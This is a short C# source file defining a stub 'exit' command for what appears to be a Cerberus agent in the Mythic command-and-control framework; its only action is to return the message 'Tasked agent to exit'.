using Models.Tasks;

namespace Tasks.Commands
{
    public class Exit : CerberusCommand
    {
        public override string Name => "exit";

        public override string Execute(MythicTask task)
        {
            return "Tasked agent to exit";
        }
    }

    public class ExitParam
    {

    }
}
